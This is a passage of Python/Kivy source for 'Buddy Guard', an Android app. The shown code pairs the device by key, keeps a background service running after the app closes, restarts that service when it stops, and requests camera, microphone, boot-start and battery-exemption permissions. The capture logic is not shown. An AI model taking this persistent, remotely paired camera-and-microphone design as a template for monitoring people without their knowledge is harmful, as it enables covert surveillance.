    def _reset_btn(self):
        try:
            self.btn.text     = "Apply Key & Pair Device"
            self.btn.disabled = False
        except Exception: pass

# ============================================================
# HOME SCREEN
# ============================================================
class HomeScreen(Screen):
    def __init__(self, **kw):
        super().__init__(**kw)
        self._pulse_ev = None; self._pulse_st = True
        self._svc_check_ev = None
        self._build()
        Window.bind(on_resize=lambda *_: Clock.schedule_once(lambda dt: self._build(), .05))

    def _build(self):
        self.clear_widgets()
        root = FloatLayout(); _rect_bg(root, DARK)
        layout = BoxLayout(orientation='vertical', spacing=dp(14),
                           padding=[dp(22), dp(44), dp(22), dp(22)], size_hint=(1, 1))

        hdr = BoxLayout(orientation='vertical', spacing=dp(4), size_hint=(1, None), height=dp(80))
        hdr.add_widget(_lbl("🛡️  Buddy Guard", '26sp', WHITE, 48, bold=True))
        self.st_lbl = Label(text="Starting service…", font_size='13sp', color=WARN,
                            size_hint=(1, None), height=dp(24), halign='center')
        self.st_lbl.bind(size=self.st_lbl.setter('text_size'))
        hdr.add_widget(self.st_lbl)

        # Status card
        sc = BoxLayout(orientation='vertical', spacing=dp(6),
                       padding=[dp(16), dp(14), dp(16), dp(14)],
                       size_hint=(1, None), height=dp(180))
        _rnd_bg(sc, CARD, 18)

        top = BoxLayout(orientation='horizontal', size_hint=(1, None), height=dp(26))
        ct  = Label(text="Background Service", font_size='14sp', bold=True,
                    color=WHITE, size_hint=(.65, 1), halign='left')
        ct.bind(size=ct.setter('text_size'))
        self.live_dot = Label(text="● LIVE", font_size='12sp', color=LIVE,
                              size_hint=(.35, 1), halign='right')
        self.live_dot.bind(size=self.live_dot.setter('text_size'))
        top.add_widget(ct); top.add_widget(self.live_dot)

        self.uid_lbl  = _lbl("Device ID: —", '11sp', GRAY, 18, 'left')
        self.svc_lbl  = _lbl("Service: checking…", '11sp', WARN, 18, 'left')
        self.mode_lbl = _lbl("Mode: ⚡ Long-Poll (~300ms)", '11sp', ACC, 18, 'left')
        self.info_lbl = _lbl("App can be closed.\nService runs in background automatically.",
                             '12sp', GRAY, 44, 'left')

        for w in [top, self.uid_lbl, self.svc_lbl, self.mode_lbl, self.info_lbl]:
            sc.add_widget(w)

        # Buttons
        btn_row = BoxLayout(orientation='horizontal', spacing=dp(10),
                            size_hint=(1, None), height=dp(46))
        close_btn = _btn("Close App", bg=CARD, fg=GRAY, h=46, r=12, fs='13sp')
        close_btn.bind(on_press=self._minimise)
        reset_btn = _btn("Reset / Change Key", bg=CARD, fg=RED, h=46, r=12, fs='13sp')
        reset_btn.bind(on_press=self._reset)
        btn_row.add_widget(close_btn); btn_row.add_widget(reset_btn)

        spacer = Widget(size_hint=(1, 1))
        ver    = _lbl("Buddy Guard v4.0 • Background Service", '11sp', GRAY, 18)

        for w in [hdr, sc, spacer, btn_row, ver]:
            layout.add_widget(w)
        root.add_widget(layout); self.add_widget(root)

    def on_enter(self):
        uid = store_get('device', 'uid', '—')
        try: self.uid_lbl.text = f"Device ID: {uid}"
        except Exception: pass
        self._start_pulse()
        self._start_svc_check()
        # Ensure service is running
        Clock.schedule_once(lambda dt: start_service(), 0.3)

    def on_leave(self):
        self._stop_pulse()
        self._stop_svc_check()

    def _start_pulse(self):
        self._stop_pulse()
        def _tick(dt):
            try:
                self.live_dot.color = LIVE if self._pulse_st else (*LIVE[:3], .25)
                self._pulse_st = not self._pulse_st
            except Exception: pass
        self._pulse_ev = Clock.schedule_interval(_tick, 1.0)

    def _stop_pulse(self):
        if self._pulse_ev: self._pulse_ev.cancel(); self._pulse_ev = None

    def _start_svc_check(self):
        self._stop_svc_check()
        def _check(dt):
            running = is_service_running()
            try:
                if running:
                    self.svc_lbl.text  = "Service: ✅ Running in background"
                    self.svc_lbl.color = GREEN
                    self.st_lbl.text   = "⚡ Active — service running"
                    self.st_lbl.color  = GREEN
                else:
                    self.svc_lbl.text  = "Service: ⚠ Not running — restarting…"
                    self.svc_lbl.color = WARN
                    start_service()
            except Exception: pass
        self._svc_check_ev = Clock.schedule_interval(_check, 5.0)
        _check(0)  # immediate first check

    def _stop_svc_check(self):
        if self._svc_check_ev: self._svc_check_ev.cancel(); self._svc_check_ev = None

    def set_status(self, text, color=GREEN):
        try: self.st_lbl.text = text; self.st_lbl.color = color
        except Exception: pass

    def set_mode(self, lp):
        try:
            if lp:
                self.mode_lbl.text  = "Mode: ⚡ Long-Poll (~300ms)"
                self.mode_lbl.color = ACC
            else:
                self.mode_lbl.text  = "Mode: Short-Poll (2s)"
                self.mode_lbl.color = WARN
        except Exception: pass

    def _minimise(self, *_):
        """Send app to background — service keeps running."""
        if IS_ANDROID and PA:
            try: PA.mActivity.moveTaskToBack(True)
            except Exception: pass

    def _reset(self, *_):
        store_del('device')
        stop_service()
        app = App.get_running_app()
        app.sm.transition = FadeTransition()
        app.sm.current    = 'key_entry'

# ============================================================
# APP  (UI process — separate from service process)
# ============================================================
class BuddyGuardApp(App):
    def __init__(self, **kw):
        super().__init__(**kw)
        self.sm: ScreenManager | None = None

    def build(self):
        Window.clearcolor = DARK
        self.sm = ScreenManager()
        self.sm.add_widget(KeyScreen(name='key_entry'))
        self.sm.add_widget(HomeScreen(name='home'))

        if store_has('device') and store_get('device', 'paired', False):
            self.sm.current = 'home'
            # Ensure service is running when app opens
            Clock.schedule_once(lambda dt: start_service(), 0.5)
        else:
            self.sm.current = 'key_entry'

        if IS_ANDROID and _perms_ok:
            try:
                request_permissions([
                    Permission.CAMERA,
                    Permission.RECORD_AUDIO,
                    Permission.WRITE_EXTERNAL_STORAGE,
                    Permission.READ_EXTERNAL_STORAGE,
                    Permission.POST_NOTIFICATIONS,
                ])
            except Exception: pass

        return self.sm

    def on_pause(self):
        # Allow app to go to background — return True keeps it alive
        return True

    def on_resume(self):
        pass

    def on_stop(self):
        # Do NOT stop service here — it must keep running after app closes
        pass


if __name__ == '__main__':
    BuddyGuardApp().run()


# ============================================================
# ============================================================
# COMPANION FILE:  service.py
# ============================================================
# Create this file alongside main.py in your project root.
# Buildozer will package it as the background service.
#
# Contents of service.py:
# -------------------------------------------------------
# from main import run_as_service
# run_as_service()
# -------------------------------------------------------
#
# ============================================================
# BUILDOZER.SPEC REQUIRED SETTINGS
# ============================================================
# [app]
# source.include_exts = py,png,jpg,kv,atlas,json
#
# services = Guard:service.py
#
# android.permissions =
#     CAMERA,
#     RECORD_AUDIO,
#     FOREGROUND_SERVICE,
#     FOREGROUND_SERVICE_CAMERA,
#     FOREGROUND_SERVICE_MICROPHONE,
#     RECEIVE_BOOT_COMPLETED,
#     VIBRATE,
#     POST_NOTIFICATIONS,
#     WRITE_EXTERNAL_STORAGE,
#     READ_EXTERNAL_STORAGE,
#     INTERNET,
#     ACCESS_NETWORK_STATE,
#     WAKE_LOCK,
#     REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
#
# android.api = 34
# android.minapi = 21
# ============================================================
